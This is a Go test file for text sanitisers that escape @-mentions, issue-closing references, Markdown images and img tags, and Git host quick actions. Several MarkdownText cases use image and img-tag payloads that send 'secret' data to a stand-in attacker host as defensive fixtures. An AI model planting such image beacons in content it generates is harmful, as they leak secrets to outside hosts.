package gitchange

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestPlainText(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		in   string
		want string
	}{
		{name: "plain text", in: "Raise the threshold to 5m.", want: "Raise the threshold to 5m."},
		{name: "a user mention", in: "cc @octocat please", want: "cc `@octocat` please"},
		{name: "a team mention", in: "ask @acme/payments", want: "ask `@acme/payments`"},
		{name: "a mention at the start", in: "@octocat look", want: "`@octocat` look"},
		{name: "an email address", in: "mail ops@example.com", want: "mail ops@example.com"},
		{name: "a mention already in a code span", in: "see `@octocat`", want: "see `@octocat`"},
		{name: "fixes an issue", in: "Fixes #12", want: "Fixes `#12`"},
		{name: "closes an issue in another repo", in: "closes acme/api#3 and more", want: "closes `acme/api#3` and more"},
		{name: "resolved with a colon", in: "Resolved: #7", want: "Resolved: `#7`"},
		{name: "an issue URL", in: "fix https://github.com/acme/api/issues/9", want: "fix `https://github.com/acme/api/issues/9`"},
		{name: "an issue reference with no keyword", in: "related to #12", want: "related to #12"},
		{name: "both", in: "Fixes #1, cc @a", want: "Fixes `#1`, cc `@a`"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			require.Equal(t, tt.want, PlainText(tt.in))
		})
	}
}

func TestMarkdownText(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		in   string
		want string
	}{
		{name: "plain text", in: "Raise the threshold.", want: "Raise the threshold."},
		{name: "an image", in: "![x](https://attacker.example/p?d=secret)", want: `!\[x](https://attacker.example/p?d=secret)`},
		{name: "an image by reference", in: "![x][ref]\n\n[ref]: https://attacker.example/p", want: `!\[x][ref]` + "\n\n[ref]: https://attacker.example/p"},
		{name: "an img tag", in: `<img src="https://attacker.example/p">`, want: `&lt;img src="https://attacker.example/p">`},
		{name: "a link stays", in: "[runbook](https://example.com/rb)", want: "[runbook](https://example.com/rb)"},
		{name: "a mention and an image", in: "@octocat ![x](https://a.example/i)", want: "`@octocat` " + `!\[x](https://a.example/i)`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			require.Equal(t, tt.want, MarkdownText(tt.in))
		})
	}
}

func TestOneLine(t *testing.T) {
	t.Parallel()

	require.Equal(t, "a b c", OneLine("a\n\tb \r\n c\x00"))
	require.Empty(t, OneLine(" \n "))
}

func TestTextRules(t *testing.T) {
	t.Parallel()

	quickAction := func(s string) string { return strings.ReplaceAll(s, "\n/", "\n`/`") }

	require.Equal(t, "a\n`/`merge `@x`", PlainText("a\n/merge @x", quickAction), "the host's rule runs after the shared ones")
	require.Equal(t, "a\n`/`merge `@x` &lt;b>", MarkdownText("a\n/merge @x <b>", quickAction), "the Markdown escapes run last")
}
